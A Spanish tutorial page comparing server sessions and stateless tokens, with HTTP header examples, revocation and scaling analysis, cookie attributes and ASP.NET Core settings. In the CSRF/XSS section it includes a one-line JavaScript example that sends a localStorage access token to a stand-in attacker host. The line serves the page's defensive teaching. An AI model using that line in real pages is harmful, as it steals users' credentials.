# Sesiones vs Tokens

## ¿Qué es?

Las dos familias de solución al mismo problema: cómo recuerda un servidor que ya te autenticaste, petición tras petición. Con **sesión**, el estado del login vive en el servidor y el navegador solo lleva un identificador que apunta a él. Con **token**, el estado viaja dentro de lo que lleva el cliente, firmado, y el servidor no guarda nada.

## ¿Por qué existe?

HTTP no tiene memoria. Cada petición es independiente y llega sin saber quién la manda: el servidor recibe `GET /pedidos/4711` y, por sí solo, no tiene forma de relacionarla con el `POST /login` que la clienta 42 hizo hace treinta segundos. Si no se añade nada, habría que enviar usuario y contraseña en cada petición, que es exactamente lo que no se quiere hacer.

Hacen falta, entonces, dos cosas: algo que el cliente presente en cada petición, y un modo de que el servidor lo interprete. Y ahí se abren los dos caminos.

> Piensa en el guardarropa de un teatro. En el modelo **sesión**, dejas el abrigo y te dan un número: el número no dice nada por sí mismo, el abrigo lo tiene el guardarropa y solo él sabe que el 738 es tuyo. En el modelo **token**, te dan un pase con tus datos escritos y sellados con un sello difícil de falsificar: el guardarropa no apunta nada, lee tu pase, comprueba el sello y te deja pasar. Un número sirve de poco si te lo roban y el guardarropa sospecha; un pase sellado funciona en cualquier puerta del teatro, pero también en las manos de quien te lo quite, y no hay lista de la que borrarte.

Ese contraste —quién guarda el estado— es toda la ficha. El formato concreto del token, su estructura y su firma se cubren en [JWT](JWT.md); aquí basta con decir «un token firmado». Y si lo que buscas es la diferencia entre *autenticar* y *autorizar*, o el significado de un `401` frente a un `403`, eso está en [Autenticación vs Autorización](Autenticacion-vs-Autorizacion.md).

## ¿Cuándo y para qué se usa?

El escenario que recorre la ficha es una tienda online: una API en .NET en `api.tienda.ejemplo.com` y un frontend en `tienda.ejemplo.com`, con tablas `Clientes`, `Pedidos` y `Sesiones`, y los roles `Cliente`, `Empleado` y `Administrador`. La API está desplegada en **cuatro instancias detrás de un balanceador**, que es justo el detalle que hace la comparación interesante: casi todas las diferencias entre los dos modelos se vuelven visibles cuando hay más de un proceso atendiendo.

- **Sesión en el servidor** — aplicaciones web con un solo dominio, renderizadas en servidor o con un frontend propio: el panel de `Empleado`, el backoffice, la propia web de la tienda.
- **Token sin estado** — clientes que no son un navegador de tu dominio: la app móvil de la tienda, otro servicio que llama a la API en nombre de la clienta, o un frontend en un dominio distinto.

---

## El flujo completo, cabecera por cabecera

La diferencia se ve mejor en las cabeceras reales que en cualquier explicación. Son dos intercambios de dos pasos cada uno.

### Con sesión en el servidor

El login envía las credenciales y el servidor responde **con una cookie**:

```http
POST /login HTTP/1.1
Host: api.tienda.ejemplo.com
Content-Type: application/json

{"email":"carmen.ruiz@ejemplo.com","password":"..."}
```

```http
HTTP/1.1 200 OK
Set-Cookie: tienda.sid=8Kj2mQx7pR4vN9wL3bT6yH; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=1800
Content-Type: application/json

{"cliente":42,"nombre":"Carmen Ruiz"}
```

Antes de responder, el servidor ha insertado una fila en `Sesiones`: identificador `8Kj2mQx7...`, cliente `42`, rol `Cliente`, fecha de creación y de caducidad. La cookie no contiene ninguno de esos datos, solo el identificador.

La petición siguiente la manda el navegador **sola**, sin que el frontend haga nada:

```http
GET /pedidos/4711 HTTP/1.1
Host: api.tienda.ejemplo.com
Cookie: tienda.sid=8Kj2mQx7pR4vN9wL3bT6yH
```

El servidor lee la cookie, busca esa fila en `Sesiones`, y de ahí saca que quien pregunta es la clienta 42. **Una consulta al almacén por petición**: eso es el coste del modelo.

### Con token sin estado

El mismo login, pero la respuesta trae el token en el cuerpo y no hay cookie:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJDbGllbnRlIiwiZXhwIjoxNzE5OTk5OTk5fQ.rP7xK2mQ...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

Nadie ha escrito nada en `Sesiones`. El token lleva dentro el identificador 42, el rol `Cliente` y su caducidad, y una firma que impide modificarlo.

Ahora el cliente tiene que adjuntarlo **explícitamente** en cada petición, en el esquema `Bearer` del RFC 6750:

```http
GET /pedidos/4711 HTTP/1.1
Host: api.tienda.ejemplo.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJDbGllbnRlIiwiZXhwIjoxNzE5OTk5OTk5fQ.rP7xK2mQ...
```

El servidor verifica la firma con su clave, comprueba que no ha caducado y lee el `42` de dentro. **Ninguna consulta al almacén.** Cualquiera de las cuatro instancias hace esto igual de bien, sin coordinarse con las otras.

Las dos diferencias operativas más importantes ya están a la vista: quién adjunta la credencial (el navegador sola, o tu código) y si hay que preguntarle algo a un almacén.

## La tabla de decisión

Este es el centro de la ficha. Ninguna fila es un detalle menor, pero hay una que decide en la práctica, y está marcada.

| | Sesión en el servidor | Token firmado sin estado |
|---|---|---|
| **Dónde vive el estado** | En el servidor: fila en `Sesiones`, entrada en Redis o memoria del proceso | En el propio token, en el cliente |
| **Al reiniciar el servidor** | Se pierden las sesiones si están en memoria del proceso; sobreviven si hay almacén externo | Nada que perder: los tokens emitidos siguen siendo válidos |
| **Revocación inmediata** ⭐ | **Sí, gratis**: se borra la fila y la siguiente petición falla | **No**: el token vale hasta que caduca; no hay nada que borrar |
| **Escalado horizontal** | Necesita almacén compartido o *sticky sessions* | Trivial: cualquier instancia valida sin coordinación |
| **Tamaño por petición** | Decenas de bytes (el identificador) | Cientos de bytes o varios KB (todos los *claims*) |
| **Exposición a CSRF** | Alta si no se mitiga: la cookie se envía sola | Nula: `Authorization` la pone tu código, nunca el navegador |
| **Exposición a XSS** | Baja con `HttpOnly`: JavaScript no puede leer la cookie | Alta si el token está en `localStorage`: cualquier script lo lee |
| **Coste por petición** | Una lectura del almacén | Una verificación de firma en CPU |
| **Varios dominios o subdominios** | Incómodo: las cookies están atadas al dominio | Natural: la cabecera va a donde la mandes |
| **Clientes móviles o servicio a servicio** | Forzado: hay que gestionar un almacén de cookies fuera del navegador | Natural: es una cabecera más |

Fíjate en que las dos filas de seguridad **no** dicen que un modelo sea mejor: dicen que se intercambia un vector por otro. Eso se desarrolla más abajo.

## La revocación es la diferencia que importa

De todas las filas, esta es la que suele decidir. Y se entiende mejor con una fecha y una hora.

Son las **10:00 de un martes** y se despide a un `Empleado` con acceso al panel de pedidos. Recursos Humanos avisa a sistemas: hay que cortarle el acceso ya.

**Con sesión en el servidor**, la respuesta es una sentencia:

```sql
DELETE FROM Sesiones WHERE ClienteId = 91;
```

A las 10:00:04 ese empleado pincha en cualquier enlace del panel. Su navegador manda la cookie de siempre, la instancia que atienda busca la fila, no la encuentra, y responde `401 Unauthorized`. **Cuatro segundos.** No importa en qué instancia estuviera, porque todas leen el mismo almacén.

**Con un token firmado de una hora de vida**, no hay ninguna sentencia que escribir. El token que ese empleado tiene en el móvil se emitió a las 09:37 y caduca a las 10:37. Las cuatro instancias lo seguirán aceptando porque **la firma sigue siendo válida y la fecha de caducidad no ha llegado**: no consultan nada, así que no hay nada que puedas cambiar para que dejen de aceptarlo. Y si la vida del token fuera de una hora desde su última renovación silenciosa, la ventana se estira todavía más.

Ese es el precio real de no tener estado, y conviene decirlo sin adornos: **«sin estado» y «revocación inmediata» son objetivos en tensión directa**. No es un defecto de implementación que se pueda arreglar con más cuidado; es la consecuencia lógica de que el servidor no guarde nada.

Las salidas habituales son tres, y las dos primeras reintroducen estado por la puerta de atrás:

- **Vidas muy cortas** (5-15 minutos) — no elimina la ventana, la reduce. Es la única que mantiene el modelo verdaderamente sin estado.
- **Lista de revocación** consultada en cada petición — funciona, y en ese momento tienes una lectura por petición, igual que una sesión, pero con un token más grande viajando.
- **Un mecanismo con estado solo para renovar**, que es el híbrido del que se habla más abajo.

## El escalado, con el problema concreto

Aquí es donde las cuatro instancias dejan de ser un detalle del enunciado.

La clienta 42 hace login. El balanceador la manda a la **instancia A**, que crea la sesión y la guarda en la memoria de su propio proceso. Devuelve la cookie. Segundos después, la clienta abre su pedido #4711 y esa petición cae, por reparto normal de carga, en la **instancia C**.

```
POST /login      → instancia A → sesión 8Kj2mQx7 creada en memoria de A ✅
GET /pedidos/4711 → instancia C → ¿8Kj2mQx7? no la conozco → 401 ❌
```

La sesión no se ha perdido: está intacta en la memoria de A. Simplemente, C no puede verla. El síntoma que llega a soporte es «me echa de la sesión cada dos por tres, pero no siempre», y ese *no siempre* es la pista: con cuatro instancias, una de cada cuatro peticiones acierta.

Hay tres salidas:

1. **Sticky sessions** (o *afinidad de sesión*): el balanceador manda siempre a la misma clienta a la misma instancia. Funciona, y es la peor de las tres. Rompe los despliegues, porque al reiniciar la instancia A todas sus sesiones desaparecen de golpe mientras las otras tres siguen tan campantes; desequilibra la carga, porque el reparto deja de depender de la ocupación real; y complica el escalado automático, ya que quitar una instancia desconecta a todo el mundo que estaba pegado a ella.

2. **Sesión en un almacén compartido**: las cuatro instancias leen y escriben en el mismo sitio, típicamente Redis o la propia base de datos. Es la solución correcta para el modelo de sesión. Añade una dependencia de red en el camino de cada petición, así que conviene entender cómo se comporta ese almacén y qué pasa cuando no responde: eso lo desarrolla la colección de [caching](../../bases-de-datos/caching/README.md).

3. **Tokens sin estado**: no hay nada que compartir, porque no hay nada guardado. Cualquier instancia valida la firma con la misma clave y sigue adelante.

En ASP.NET Core hay un matiz que sorprende: la autenticación por cookie **no crea una sesión en el servidor por defecto**. Cifra el *ticket* con los *claims* dentro de la propia cookie, así que se comporta como un token en cuanto a estado —sobrevive a los reinicios y funciona con cuatro instancias— y **también hereda su problema de revocación**. Para tener sesión de verdad en servidor hay que enchufar un `ITicketStore`:

```csharp
builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =>
    {
        options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
        options.SlidingExpiration = true;
        options.SessionStore = new AlmacenDeSesionesEnRedis();   // ← esto es lo que da revocación
    });
```

Sin esa última línea, `HttpContext.SignOutAsync()` solo le dice al navegador que borre la cookie: si alguien copió su valor antes, sigue sirviendo hasta que caduque. Con `SessionStore`, el cierre de sesión borra la entrada y el valor copiado deja de valer al instante. Ojo también con `SlidingExpiration`, que renueva la cookie a cada uso y por tanto alarga esa ventana indefinidamente mientras haya actividad.

Un último detalle: con las cuatro instancias, el cifrado de esa cookie depende de las claves de *data protection*. Si cada instancia genera las suyas, la cookie que emite A no la descifra C, y vuelves al mismo síntoma intermitente por un motivo distinto.

## El tamaño de lo que viaja

Este apartado parece cosmético hasta que se ponen números.

Un identificador de sesión son **entre 30 y 60 bytes** de cabecera: 128 bits de aleatoriedad codificados, más el nombre de la cookie. Un token firmado con un puñado de *claims* —identificador, rol, emisor, audiencia, caducidad— ronda los **400-800 bytes**, y con un directorio corporativo que mete los grupos de la persona como *claims* pasa de los **4 KB** sin esfuerzo.

Y viaja **en cada petición**. Con una carga de página del panel de pedidos que dispara 50 peticiones entre datos y recursos:

```
Sesión:  50 × 50 bytes  =  2,5 KB subidos por carga de página
Token:   50 × 800 bytes =  40 KB subidos por carga de página
                            ────────
                            ×16 de diferencia
```

En una oficina con fibra no se nota. En una conexión móvil, donde la subida es la dirección lenta y la latencia se paga por paquete, 40 KB por pantalla se convierten en un retardo perceptible.

Pero el peligro concreto no es la lentitud, es el fallo seco. Muchos servidores y balanceadores tienen un límite por defecto de **unos 8 KB para las cabeceras**: nginx (`large_client_header_buffers 4 8k`), varios balanceadores gestionados, y Kestrel con su límite por línea de cabecera. Cuando el token pasa de ahí, la petición no llega a tu código:

```http
HTTP/1.1 431 Request Header Fields Too Large
```

Y a veces ni eso: algunos intermediarios responden un `400 Bad Request` sin cuerpo ni explicación. El síntoma clásico es desconcertante: **la API funciona para todo el mundo menos para dos personas**, que resultan ser las que pertenecen a treinta grupos del directorio corporativo. La lección práctica es que un token es un transporte de identidad, no un almacén de perfil: mete lo mínimo para autorizar y consulta el resto. Qué poner exactamente en él es asunto de [RBAC y Claims](RBAC-y-Claims.md).

## Cookie o `Authorization`: se cambia un vector por otro

Aquí está el malentendido más extendido, y merece decirse claro: **el token no es más seguro que la cookie**. Se cambia una vulnerabilidad por otra distinta.

**La cookie se envía sola.** Esa es su comodidad y su problema. Si alguien te lleva a una página suya que hace un `POST` a `api.tienda.ejemplo.com`, el navegador adjunta tu cookie sin preguntar, porque para él es una petición legítima a ese dominio. Eso es **CSRF** (*Cross-Site Request Forgery*): la petición es tuya, la intención no. Se mitiga con `SameSite`, que le dice al navegador que no mande la cookie en peticiones originadas en otro sitio, y con un *token* anti-CSRF que el atacante no puede leer ni adivinar.

**El token en `Authorization` no sufre CSRF** porque el navegador nunca lo pone: lo adjunta tu JavaScript, y el JavaScript del atacante corre en otro origen y no tiene acceso al tuyo. Pero para que tu código pueda leerlo tiene que estar en algún sitio legible, y si ese sitio es `localStorage`, **cualquier XSS se lo lleva**. Una única línea inyectada en una dependencia de tu frontend basta:

```javascript
// ❌ Lo que hace un XSS en dos líneas cuando el token está en localStorage
fetch('https://atacante.ejemplo/recoger?t=' + localStorage.getItem('access_token'));
```

Y aquí está la asimetría que decide: con una cookie `HttpOnly`, el mismo XSS **no puede leer nada**. Puede hacer peticiones en tu nombre mientras la víctima tenga la página abierta —que ya es grave— pero no puede exfiltrar la credencial para usarla mañana desde otra máquina. Robar el valor y hacer peticiones desde dentro del navegador de la víctima no son el mismo nivel de daño.

Por eso, para una aplicación web propia con un solo dominio, esta cookie sigue siendo lo más difícil de romper:

```http
Set-Cookie: tienda.sid=8Kj2mQx7pR4vN9wL3bT6yH; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=1800
```

Atributo por atributo:

- **`tienda.sid=8Kj2mQx7...`** — nombre y valor. El valor debe ser aleatorio criptográficamente y de al menos 128 bits; nada de identificadores incrementales ni de datos de la clienta codificados.
- **`Path=/`** — la cookie se envía a toda la API, no solo a una rama de rutas.
- **`HttpOnly`** — JavaScript no puede leerla. `document.cookie` no la ve. Es la línea que convierte un XSS de robo de credencial en un XSS de acciones limitadas.
- **`Secure`** — solo viaja por HTTPS. Sin esto, una petición accidental por HTTP la manda en claro y quien esté en la red la lee. Es una línea, y omitirla anula todo lo demás.
- **`SameSite=Strict`** — el navegador no la adjunta en peticiones que vengan de otro sitio. Cierra el CSRF de raíz. `Strict` tiene un efecto lateral que hay que conocer: si alguien llega a tu web desde un enlace externo, la primera petición va sin cookie y verá la pantalla de login. `Lax` evita eso permitiendo la cookie en navegaciones de tipo `GET`, y es el compromiso habitual.
- **`Max-Age=1800`** — caduca en 30 minutos. Sin `Max-Age` ni `Expires` es una cookie de sesión de navegador, que muere al cerrarlo pero que muchos navegadores restauran al reabrir.

Falta un atributo a propósito: **no hay `Domain`**. Sin él, la cookie queda atada exactamente a `api.tienda.ejemplo.com`. Poner `Domain=.tienda.ejemplo.com` la comparte con todos los subdominios, lo que suena cómodo y significa que cualquier subdominio comprometido —incluido uno de un tercero— la recibe.

Y un último detalle de higiene: **el identificador de sesión se regenera al autenticar**. Si la persona ya tenía uno como anónima, se descarta y se emite otro. De lo contrario, un atacante puede plantar un identificador conocido antes del login y reutilizarlo ya autenticado; se llama *session fixation*. Cómo se guarda ese identificador en la tabla `Sesiones` —hasheado, no en claro, y con qué algoritmo— lo explica [Contraseñas vs tokens de sesión](../algoritmos-de-hash/Contrasenas-Vs-Tokens-De-Sesion.md).

## El híbrido, que es lo que hace casi todo el mundo

Puesto que el modelo sin estado escala solo y el modelo con estado revoca al instante, la salida evidente es quedarse con las dos cosas: un **token de acceso corto y sin estado** (minutos) que las cuatro instancias validan sin consultar nada, más un **mecanismo con estado y de vida larga** que sirve para renovarlo y, sobre todo, para cortarlo. Al empleado despedido a las 10:00 se le invalida ese segundo mecanismo, y su token de acceso deja de renovarse: pierde el acceso en cuanto caduca el que tenía en la mano, minutos, no una hora. Sigue habiendo estado en el servidor —de ahí que «sin estado» sea casi siempre una verdad parcial— pero se consulta una vez cada varios minutos en lugar de en cada petición.

Ese patrón tiene su propia ficha: [Modelo JWT + Refresh Token](JWT-Refresh.md). Y la decisión de cómo implementar la parte con estado —con un token autocontenido o con uno opaco que no significa nada por sí mismo— se compara en [JWT + Refresh vs Tokens opacos](JWT-Refresh-vs-Tokens-Opacos.md), con el detalle del segundo en [Tokens opacos de sesión](Tokens-Opacos.md).

## Cuándo elegir cada una

**Elige sesión con cookie** si tienes una aplicación web propia servida desde un solo dominio y el navegador es el único cliente. Es más simple, revoca gratis, y con `HttpOnly` + `Secure` + `SameSite` es el modelo más difícil de romper. Que sea el modelo clásico no lo hace anticuado; lo hace probado.

**Elige token** si el cliente no es un navegador de tu dominio: app móvil, otro servicio llamando a la API, un frontend en otro dominio, o varios clientes distintos consumiendo la misma API. Ahí la cookie es un estorbo y la cabecera es lo natural.

**Cuándo NO usar sesión**: cuando no puedas garantizar un almacén compartido para las cuatro instancias, cuando el cliente no gestione cookies, o cuando la API la consuman terceros a los que no puedes pedir que mantengan un almacén de cookies.

**Cuándo NO usar token puro sin estado**: cuando necesites cerrar sesión de verdad, cuando maneje datos que exijan cortar el acceso al instante ante un incidente, o cuando la identidad arrastre tantos *claims* que el token roce el límite de cabeceras. En esos casos, o vuelves a la sesión o vas al híbrido.

Y el matiz que conviene interiorizar: **«sin estado» rara vez es cierto del todo** en cuanto necesitas revocar. Casi todo el mundo acaba con estado en el servidor; la pregunta útil no es «con estado o sin él», sino «con qué frecuencia hay que consultarlo».

## Errores frecuentes

| Síntoma | Causa |
|---|---|
| Las sesiones se pierden en cada despliegue | Están en memoria del proceso: al reiniciar, se van con él |
| Se pierde la sesión de forma intermitente, «una de cada cuatro veces» | Cuatro instancias sin almacén compartido, o cada una con sus propias claves de *data protection* |
| Cerrar sesión no cierra nada: el token sigue funcionando | No hay estado que borrar; solo se limpió el cliente |
| Cuentas robadas tras un incidente en el frontend | El token estaba en `localStorage` y un XSS lo exfiltró |
| La cookie aparece en claro en una captura de red | Falta `Secure`: viaja también por HTTP |
| Se ejecutan acciones que la clienta no pidió, desde su navegador | Falta `SameSite` (y falta *token* anti-CSRF): la cookie se envía sola |
| `431 Request Header Fields Too Large`, o un `400` sin explicación, solo para algunas personas | Token con demasiados *claims* (los grupos del directorio) contra el límite de 8 KB de cabeceras |
| Al llegar desde un enlace externo pide login, y luego ya funciona | `SameSite=Strict`: la primera petición cruzada va sin cookie |

## Buenas prácticas avanzadas

- **Comprueba si tu «cookie de sesión» es en realidad un token disfrazado.** La autenticación por cookie de ASP.NET Core cifra los *claims* dentro de la propia cookie: no hay nada en el servidor, así que hereda el problema de revocación del modelo sin estado aunque el mecanismo de transporte sea una cookie. Sin un `ITicketStore` configurado, `SignOutAsync` solo pide al navegador que la borre. Antes de dar por buena la revocación, haz la prueba: copia el valor de la cookie, cierra sesión, y reenvíala con `curl`. Si responde `200`, no tienes sesión.
- **Fija un presupuesto de bytes para el token y protégelo con un test.** Un límite explícito —512 bytes, por ejemplo— y una prueba que falle al superarlo evitan el `431` que aparece solo en producción y solo para quien pertenece a muchos grupos. La regla de fondo es que el token transporta lo que hace falta para *autorizar*, no el perfil: el nombre para mostrar, el idioma o la lista de permisos finos se consultan, no se llevan.
- **Rota el identificador de sesión al autenticar y al elevar privilegios.** El caso del login es conocido; el segundo lo es menos. Si un `Empleado` pasa a `Administrador` dentro de la misma sesión, emitir un identificador nuevo en ese punto limita el valor de un identificador capturado antes de la elevación. Vale igual para el cambio de contraseña, que debería invalidar todas las demás sesiones de esa persona.
- **Mide cuánto tarda de verdad tu revocación y trátalo como un dato de operación.** No es «inmediata» o «no inmediata», es un número: cuatro segundos con sesión en almacén compartido, hasta 60 minutos con un token de una hora, unos minutos con el híbrido. Escríbelo en la documentación del sistema, porque es la cifra que te van a pedir en un incidente y la que decide si el plan de respuesta es viable.
- **Trata el almacén de sesiones como parte del camino crítico, no como una caché.** Si las cuatro instancias no pueden leerlo, nadie está autenticado: la caída del almacén es la caída del servicio. Eso obliga a decidir a conciencia el *timeout*, el reintento y qué hacer cuando no responde, y explica por qué el modelo sin estado sigue siendo atractivo pese a la revocación.
- **No mezcles los dos modelos en la misma API sin una frontera clara.** Aceptar cookie y `Authorization` a la vez es legítimo —web propia y app móvil contra la misma API— pero si un mismo endpoint admite ambas, hereda las dos superficies de ataque: vuelve a ser vulnerable a CSRF por la vía de la cookie aunque el cliente principal use la cabecera. Separa los esquemas por ruta y sé explícito sobre cuál acepta cada una.

## Documentación oficial

- [RFC 6265bis — Cookies: HTTP State Management Mechanism](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis) — la especificación viva de cookies. Ve a la sección de atributos de `Set-Cookie` cuando tengas que justificar el comportamiento exacto de `SameSite`, `Secure`, `Domain` o los prefijos `__Host-` y `__Secure-`: es la única fuente que dice qué está obligado a hacer el navegador y qué es cortesía suya.
- [RFC 6750 — The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750) — define el esquema `Bearer`. Consúltalo para la sintaxis literal de la cabecera `Authorization` y, sobre todo, para la sección 3: qué debe contener la respuesta `WWW-Authenticate` de un `401` y qué códigos de error usar cuando el token falta, está caducado o es inválido.
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) — la referencia normativa de facto para el modelo con estado. Ve directamente a las secciones de longitud y entropía del identificador, regeneración tras el login y expiración: son requisitos concretos y comprobables, no consejos vagos.
- [Autenticación por cookie en ASP.NET Core](https://learn.microsoft.com/aspnet/core/security/authentication/cookie) — la documentación del framework del ejemplo. La parte a leer sin saltarse nada es la de `ITicketStore` y `SessionStore`, porque es la que aclara que sin ella el cierre de sesión no invalida nada en el servidor.

## Recursos didácticos

- [SameSite cookies explained (web.dev)](https://web.dev/articles/samesite-cookies-explained) — recorre `Strict`, `Lax` y `None` con ejemplos de navegación reales y explica por qué llegar desde un enlace externo con `Strict` te deja fuera. Es la mejor forma de entender el atributo antes de elegirlo.
- [Laboratorios de CSRF de la PortSwigger Web Security Academy](https://portswigger.net/web-security/csrf) — CSRF explicado a base de explotarlo tú en un entorno de prácticas. Doce minutos ahí dejan claro por qué «la cookie se envía sola» es un problema y no un detalle, mucho mejor que cualquier párrafo.
- [La pestaña *Application → Cookies* de las herramientas de desarrollo](https://developer.chrome.com/docs/devtools/application/cookies) — para ver en vivo, en cualquier web, qué atributos lleva cada cookie y cuáles faltan. Empieza auditando la tuya: si `HttpOnly` o `Secure` no están marcados, lo verás en dos segundos.

---

*En resumen: la sesión guarda el estado en el servidor y te da solo un número, así que revocar es un `DELETE` de cuatro segundos pero hay que compartir ese estado entre las cuatro instancias; el token lleva el estado firmado consigo y escala solo, pero no hay nada que borrar hasta que caduque — y por eso casi todo el mundo termina con un token corto y algo con estado detrás para poder cortar.*
